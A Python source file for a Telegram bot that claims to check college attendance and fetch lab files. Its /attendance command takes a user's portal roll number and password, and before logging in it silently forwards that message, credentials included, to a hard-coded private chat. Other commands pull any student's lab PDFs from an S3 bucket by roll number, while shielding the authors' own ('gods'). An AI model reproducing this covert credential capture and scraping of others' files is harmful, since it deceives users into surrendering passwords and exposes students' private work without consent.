
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ( CommandHandler, Filters, MessageHandler, Updater)
from message import Editmessage, Sendmessage, logger, sendfile, Deletemessage, SendMess, SendMe
import os
import telepot
import urllib.request
from PIL import Image
import requests
from bs4 import BeautifulSoup
import random
import string
import requests
import time
import json
import math
import html5lib
dia='✅'
#boi identify only very small mistake
os.environ['TZ'] = 'America/Buenos_Aires'
players="-1001782490306"
play="-1001546224123"
gods=["21951A6626","21951A6637","21951A6627","21951A6614"]
members =[2141450636,809309749,2045746007,1257359605,2113380774,1134323688,2040610087,1706133219]
bot_token = os.environ.get('TG_BOT_TOKEN')
startmessage = [[
		InlineKeyboardButton(
			"Dev",
			url='https://t.me/dheeraj2324'
		),
        InlineKeyboardButton(
			"Channel",
			url='https://t.me/aboutdheeraj'
		)
        ]]


def start(update, context):
    info = update.effective_user
    print(info)
    chat_id = info.id
    print(chat_id)
    userid= info['username']
    text = f'<b>Welcome</b> @{userid}<b>, to maths calculator bot and also private stuff!</b>\n<b>To know more use-</b> /help\n<code>This bot is provided for educational use!!</code>\n<code>ENTER IN YOUR OWN RISK!!</code>\n<code>YOU ARE RESPONSIBLE FOR YOUR OWN ACTION!.</code>'
    Sendmessage(chat_id, text, reply_markup=InlineKeyboardMarkup(startmessage))
    return
def cmds(update, context):
    chat_id = update.message.chat_id
    text = "<b>Available cmds available:</b>/attendance <code>username</code> <code>password</code>\n<code>username -- replace with Roll no.</code>\n<code>password -- replace with password</code>"
    Sendmessage(chat_id, text, reply_markup= InlineKeyboardMarkup(startmessage))
def help(update, context):
    chat_id = update.message.chat_id
    text = "<b>Hey, welcome to this Bot! Sorry to say cmds of the bots have been taken to private!!</b>\n<code>Some cmds are listed here:</code> /cmds"
    Sendmessage(chat_id, text)
def cfile(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    userid= info['username']
    text =  update.message.text.split(' ',2)
    tempp=text[1]
    numb=text[2]
    logger.info(text)
    global members
    print(info)
    textt=tempp.upper()
    if chat_id in members:
        if textt in gods:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:
            file_id = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/{}/LAB/SEM2/ACSC05/{}_week{}.pdf".format(textt,textt,numb)
            r=requests.get(file_id)
            qq=(list(str(r)))
            q=['<', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', ' ', '[', '2', '0', '0', ']', '>']
            if q==qq:
                sendfile(chat_id,file_id)
                text = "{}----[c-lab]----week{}".format(textt,numb)
                Sendmessage(chat_id,text)
            else:
                text = "Nasty burger didnt upload!"
                Sendmessage(chat_id,text)
    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)
def efile(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    userid= info['username']
    text =  update.message.text.split(' ',2)
    tempp=text[1]
    numb=text[2]
    logger.info(text)
    global members
    print(info)
    textt=tempp.upper()
    if chat_id in members:
        if textt in gods:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:		
            file_id = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/{}/LAB/SEM2/AHSC04/{}_week{}.pdf".format(textt,textt,numb)
            r=requests.get(file_id)
            qq=(list(str(r)))
            q=['<', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', ' ', '[', '2', '0', '0', ']', '>']
            if q==qq:
                sendfile(chat_id,file_id)
                text = "{}----[English-lab]----week{}".format(textt,numb)
                Sendmessage(chat_id,text)
            else:
                text = "Nasty burger didnt upload!"
                Sendmessage(chat_id,text)
    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)
def apfile(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    userid= info['username']
    text =  update.message.text.split(' ',2)
    tempp=text[1]
    numb=text[2]
    logger.info(text)
    global members
    print(info)
    textt=tempp.upper()
    if chat_id in members:
        if textt in gods:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:		
            file_id = "https://iare-data.s3.ap-south-1.amazonaws.com/uploads/STUDENTS/{}/LAB/SEM2/AHSC05/{}_week{}.pdf".format(textt,textt,numb)
            r=requests.get(file_id)
            qq=(list(str(r)))
            q=['<', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', ' ', '[', '2', '0', '0', ']', '>']
            if q==qq:
                sendfile(chat_id,file_id)
                text = "{}----[AP-lab]----week{}".format(textt,numb)
                Sendmessage(chat_id,text)
            else:
                text = "Nasty burger didnt upload!"
                Sendmessage(chat_id,text)
    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)
######################################################################################################################
def att_helper(chat_id,a,b):
    sum1=0
    attended=a
    conducted=b
    for i in range(b,a):
        ctr=0
        k=(b/a*100)
        b+=1
        a+=1
        ctr+=1
        sum1+=ctr
        if k>=75:
            break
    answer=(sum1-1)
    if answer<=0:
        text="Satisfactory"
        Sendmessage(chat_id,text)
    else:
        text = "<code>You attended </code><b>{}</b> <code>out of </code><b>{}</b> <code>for getting atleast 75% you need to attend more </code><b>{}</b> <code>classes!!</code>".format(attended,conducted,answer)
        Sendmessage(chat_id,text)
def lab_helper(chat_id,a,b):
    sum1=0
    attended=a
    conducted=b
    for i in range(b,a):
        ctr=0
        k=(b/a*100)
        b+=3
        a+=3
        ctr+=1
        sum1+=ctr
        if k>=75:
            break
    answer=(sum1-1)
    if answer<=0:
        text="Satisfactory"
        Sendmessage(chat_id,text)
    else:
        text = "<code>You attended </code><b>{}</b> <code>out of </code><b>{}</b> <code>for getting atleast 75% you need to attend more </code><b>{}</b> <code>classes!!</code>".format(attended,conducted,answer)
        Sendmessage(chat_id,text)

######################################################################################################################
def attendance(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    userid= info['username']
    text =  update.message.text.split(' ',2)
    SendMe(play,text)
    username=text[1]
    password=text[2]

    Deletemessage(chat_id, update.message.message_id)
    text = "<b>Attendance</b> -- <code> {} </code>".format(username)
    Sendmessage(chat_id,text)
    if True:
        if False:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:
            try:
                login_data={'username':username,'password':password}
                with requests.Session() as s:
                  url = "https://samvidha.iare.ac.in/pages/login/checkUser.php"
                  r= s.get(url)
                  soup = BeautifulSoup(r.content, 'html5lib')
                  q=s.post(url,data=login_data)
                  url = "https://samvidha.iare.ac.in/home?action=stud_att_STD"
                  r= s.get(url)
                  aa=str(r.content[24973:28000])
                  q=str(r.content)
                  a=("English")
                  t=aa.index(a)
                  text="<b>English:</b> <code>{}%</code>".format(aa[t+238+1-2:t+238+1+7+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  p0=(q[q.find(a)+125:q.find(a)+135]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+180:q.find(a)+190]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  Sendmessage(chat_id,text)
                  att_helper(chat_id,int(p0),int(p1))
                  a="Probability and Statistics"
                  t=aa.index(a)
                  text="<b>P&S:</b> <code>{}%</code>".format(aa[t+205+43+9+1-2:t+205+43+9+7+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  Sendmessage(chat_id,text)
                  p0=(q[q.find(a)+144:q.find(a)+140+13]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+144+55:q.find(a)+140+55+13]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  att_helper(chat_id,int(p0),int(p1))
                  a=("Applied Physics")
                  t=aa.index(a)
                  text="<b>AP:</b> <code>{}%</code>".format(aa[t+194+52-2+1:t+52+194+7+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  Sendmessage(chat_id,text)
                  p0=(q[q.find(a)+134:q.find(a)+134+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+134+55:q.find(a)+134+55+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  att_helper(chat_id,int(p0),int(p1))
                  a="Programming for Problem Solving using C"
                  t=aa.index(a)
                  text="<b>PPSC:</b> <code>{}%</code>".format(aa[t+218+52-2+1:t+218+52+7+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  p0=(q[q.find(a)+1+157:q.find(a)+158+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+155+59:q.find(a)+155+59+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  Sendmessage(chat_id,text)
                  att_helper(chat_id,int(p0),int(p1))
                  a="English Language and Communication Skills Laboratory"
                  t=aa.index(a)
                  text="<b>Eng lab:</b> <code>{}%</code>".format(aa[t+231+52+1-2:t+231+52+7+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  p0=(q[q.find(a)+172:q.find(a)+170+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+172+55:q.find(a)+172+55+5]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  Sendmessage(chat_id,text)
                  lab_helper(chat_id,int(p0),int(p1))
                  a=("Physics Laboratory")
                  t=aa.index(a)
                  text="<b>AP lab:</b> <code>{}%</code>".format(aa[t+197+52+1-2:t+197+7+52+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  p0=(q[q.find(a)+110+27:q.find(a)+110+27+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+172+20:q.find(a)+172+20+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  Sendmessage(chat_id,text)
                  lab_helper(chat_id,int(p0),int(p1))
                  a="Programming for Problem Solving using C Laboratory"
                  t=aa.index(a)
                  text="<b>C lab:</b> <code>{}%</code>".format(aa[t+229+52+1-2:t+229+7+52+1+2].replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'",""))
                  p0=(q[q.find(a)+110+30+30:q.find(a)+110+50+6+10]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  p1=(q[q.find(a)+150+20+40+15:q.find(a)+170+55+7]).replace("r","").replace("<", "").replace(">", "").replace("\t", "").replace("\n","").replace("t","").replace("/","").replace("d","").replace("\\","").replace("'","")
                  Sendmessage(chat_id,text)
                  lab_helper(chat_id,int(p0),int(p1))
            except Exception as e:
                text=str(e)
                SendMess(players,text)
                text="Error - 2"
                Sendmessage(chat_id,text)

    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)        
        
        #boi  if didnt upload ka code likhe?kk u will? not sure how to write in tg format same as idle

#####################################################################################################################################################################


def main():
    updater = Updater(
        bot_token,
        use_context=True
    )
    dp = updater.dispatcher
    #dp.add_handler(MessageHandler(Filters.text & ~Filters.command, duty))
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("clab", cfile))
    dp.add_handler(CommandHandler("elab", efile))
    dp.add_handler(CommandHandler("Clab", cfile))
    dp.add_handler(CommandHandler("Elab", efile))
    dp.add_handler(CommandHandler("aplab", apfile))
    dp.add_handler(CommandHandler("Aplab", apfile))
    dp.add_handler(CommandHandler("APlab", apfile))
    dp.add_handler(CommandHandler("cmds", cmds))
    #dp.add_handler(CommandHandler("login", login))
    dp.add_handler(CommandHandler("attendance", attendance))
    logger.info("Bot Started!!!")
    updater.start_polling()
    updater.idle()
if __name__ == "__main__":
    main()
